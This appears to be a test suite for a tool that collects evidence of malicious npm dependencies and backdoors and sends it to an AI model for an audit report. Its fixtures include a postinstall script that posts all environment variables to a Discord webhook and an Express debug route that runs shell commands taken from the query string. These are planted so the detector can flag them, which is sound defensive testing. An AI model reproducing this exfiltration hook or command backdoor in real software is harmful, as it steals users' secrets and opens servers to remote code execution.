import { describe, expect, it } from 'vitest';
import {
  collectAuditEvidence,
  findSuspiciousLines,
  parseAuditReport,
  redactSecrets,
  renderAuditMarkdown,
  renderEvidence,
  requestAiAudit,
  type AuditEvidence,
} from '../../src/engine/aiAudit';
import { makeTempProject } from './helpers';

function project(): string {
  return makeTempProject({
    'package.json': JSON.stringify({
      name: 'app',
      scripts: { build: 'tsc' },
      dependencies: { 'evil-pkg': '1.0.0', 'plain-pkg': '2.0.0' },
    }),
    'src/index.ts': [
      'import express from "express";',
      'const app = express();',
      'app.get("/debug", (req, res) => {',
      '  require("child_process").execSync(req.query.cmd);',
      '});',
      'export const ok = 1;',
    ].join('\n'),
    'src/clean.ts': 'export const add = (a: number, b: number) => a + b;\n',
    '.env': 'SECRET_TOKEN=should-never-be-read\n',
    '.npmrc': '//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz0123456789\n',
    'node_modules/evil-pkg/package.json': JSON.stringify({
      name: 'evil-pkg',
      version: '1.0.0',
      scripts: { postinstall: 'node ./setup.js', test: 'jest' },
    }),
    'node_modules/evil-pkg/setup.js':
      'require("https").request("https://discord.com/api/webhooks/1/x", { method: "POST" }).end(JSON.stringify(process.env));\n',
    'node_modules/plain-pkg/package.json': JSON.stringify({ name: 'plain-pkg', version: '2.0.0' }),
  });
}

describe('collectAuditEvidence', () => {
  it('collects install scripts, the files they run, and suspicious lines', async () => {
    const evidence = await collectAuditEvidence(project());

    expect(evidence.installScripts).toHaveLength(1);
    expect(evidence.installScripts[0]).toMatchObject({
      name: 'evil-pkg',
      version: '1.0.0',
      via: ['evil-pkg'],
      scripts: { postinstall: 'node ./setup.js' },
    });
    expect(evidence.installScripts[0].files[0].path).toBe('setup.js');
    expect(evidence.installScripts[0].files[0].text).toContain('discord.com/api/webhooks');

    expect(evidence.hits.map((hit) => hit.file)).toEqual(['src/index.ts']);
    expect(evidence.hits[0].patterns).toContain('runs shell commands');
    expect(evidence.hits[0].snippet).toContain('4: ');

    expect(evidence.projects[0].dependencies).toEqual({ 'evil-pkg': '1.0.0', 'plain-pkg': '2.0.0' });
    expect(evidence.stats.installedPackages).toBe(2);
  });

  it('never reads .env files and redacts tokens in configs', async () => {
    const evidence = await collectAuditEvidence(project());
    const text = renderEvidence(evidence).text;

    expect(text).not.toContain('should-never-be-read');
    expect(text).not.toContain('npm_abcdefghij');
    expect(evidence.configs.map((config) => config.file)).toEqual(['.npmrc']);
    expect(evidence.configs[0].text).toContain('<redacted>');
  });

  it('notes when dependencies are not installed', async () => {
    const root = makeTempProject({ 'package.json': JSON.stringify({ name: 'app', dependencies: { left: '1' } }) });
    const evidence = await collectAuditEvidence(root);

    expect(evidence.stats.notes.join(' ')).toMatch(/No node_modules/);
  });
});

describe('redactSecrets', () => {
  it('replaces keys, tokens, private keys and URL credentials', () => {
    const text = [
      'const key = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz";',
      'aws = AKIAABCDEFGHIJKLMNOP',
      'password: hunter2hunter2',
      'https://user:pa55word@example.com/repo.git',
      '-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----',
    ].join('\n');
    const redacted = redactSecrets(text);

    expect(redacted).not.toMatch(/sk-ant-api03|AKIAABCD|hunter2|pa55word|MIIabc/);
  });

  it('leaves ordinary code alone', () => {
    const code = 'const token = getToken();\nif (user.password === input) {}';
    expect(redactSecrets(code)).toBe(code);
  });
});

describe('findSuspiciousLines', () => {
  it('flags obfuscated one-line payloads', () => {
    const hits = findSuspiciousLines('src/x.js', `const a = 1;\n${'x'.repeat(3000)}\n`);
    expect(hits[0].patterns).toContain('very long unbroken line (minified or obfuscated)');
  });

  it('caps hits per file', () => {
    const text = Array.from({ length: 100 }, () => 'eval(x);\n\n\n\n\n\n\n\n').join('');
    expect(findSuspiciousLines('a.js', text, 3)).toHaveLength(3);
  });
});

describe('renderEvidence', () => {
  it('leaves out what does not fit and says so', async () => {
    const evidence = await collectAuditEvidence(project());
    const full = renderEvidence(evidence);
    const small = renderEvidence(evidence, 200);

    expect(full.truncated).toBe(false);
    expect(small.truncated).toBe(true);
    expect(small.text.length).toBeLessThan(full.text.length);
  });
});

describe('parseAuditReport', () => {
  it('reads JSON wrapped in prose and code fences, sorted by severity', () => {
    const report = parseAuditReport('Here you go:\n```json\n' + JSON.stringify({
      verdict: 'malicious',
      summary: 'Bad.',
      findings: [
        { severity: 'low', title: 'b' },
        { severity: 'critical', category: 'install-script', title: 'a', location: 'evil-pkg@1.0.0' },
        { severity: 'moderate', title: 'c' },
      ],
    }) + '\n```');

    expect(report.verdict).toBe('malicious');
    expect(report.findings.map((finding) => [finding.severity, finding.title])).toEqual([
      ['critical', 'a'],
      ['medium', 'c'],
      ['low', 'b'],
    ]);
  });

  it('infers the verdict when missing', () => {
    expect(parseAuditReport('{"findings":[]}').verdict).toBe('clean');
    expect(parseAuditReport('{"findings":[{"severity":"critical","title":"x"}]}').verdict).toBe('malicious');
  });

  it('rejects answers without JSON', () => {
    expect(() => parseAuditReport('I cannot help with that.')).toThrow(/wasn't a report/);
  });
});

describe('requestAiAudit', () => {
  const answer = JSON.stringify({ verdict: 'clean', summary: 'Fine.', findings: [] });

  it('calls an OpenAI-compatible endpoint with the key as a bearer token', async () => {
    const calls: { url: string; init: RequestInit }[] = [];
    const fetchImpl = (async (url: string, init: RequestInit) => {
      calls.push({ url, init });
      return new Response(JSON.stringify({ choices: [{ message: { content: answer } }] }));
    }) as unknown as typeof fetch;

    const report = await requestAiAudit(
      { provider: 'openai-compatible', apiKey: 'k-123', model: 'm', baseUrl: 'https://example.test/v1/' },
      'evidence',
      { fetchImpl },
    );

    expect(report.verdict).toBe('clean');
    expect(calls[0].url).toBe('https://example.test/v1/chat/completions');
    expect((calls[0].init.headers as Record<string, string>).authorization).toBe('Bearer k-123');
    expect(JSON.parse(calls[0].init.body as string)).toMatchObject({ model: 'm', response_format: { type: 'json_object' } });
  });

  it('calls Gemini with the key in a header, not the URL', async () => {
    let url = '';
    let headers: Record<string, string> = {};
    const fetchImpl = (async (target: string, init: RequestInit) => {
      url = target;
      headers = init.headers as Record<string, string>;
      return new Response(JSON.stringify({ candidates: [{ content: { parts: [{ text: answer }] } }] }));
    }) as unknown as typeof fetch;

    await requestAiAudit({ provider: 'gemini', apiKey: 'g-key', model: 'gemini-2.5-pro' }, 'evidence', { fetchImpl });

    expect(url).toContain('/models/gemini-2.5-pro:generateContent');
    expect(url).not.toContain('g-key');
    expect(headers['x-goog-api-key']).toBe('g-key');
  });

  it('reports a rejected key', async () => {
    const fetchImpl = (async () => new Response(JSON.stringify({ error: { message: 'Incorrect API key' } }), { status: 401 })) as unknown as typeof fetch;

    await expect(requestAiAudit({ provider: 'openai', apiKey: 'bad', model: 'gpt-5' }, 'e', { fetchImpl }))
      .rejects.toThrow(/401: Incorrect API key Check the API key/);
  });
});

describe('renderAuditMarkdown', () => {
  it('renders findings and evidence counts', () => {
    const evidence: AuditEvidence = {
      projects: [],
      installScripts: [],
      hits: [],
      configs: [],
      stats: { filesChecked: 3, installedPackages: 10, notes: [] },
    };
    const markdown = renderAuditMarkdown(
      {
        verdict: 'suspicious',
        summary: 'One issue.',
        findings: [{
          severity: 'high', category: 'backdoor', title: 'Debug route runs commands', location: 'src/index.ts:4',
          evidence: 'execSync(req.query.cmd)', explanation: 'Remote code execution.', recommendation: 'Remove the route.',
        }],
      },
      { projectName: 'app', provider: 'anthropic', model: 'claude-opus-5-5', evidence, truncated: false },
    );

    expect(markdown).toContain('## 🟠 Debug route runs commands');
    expect(markdown).toContain('execSync(req.query.cmd)');
    expect(markdown).toContain('of 10 installed');
  });
});
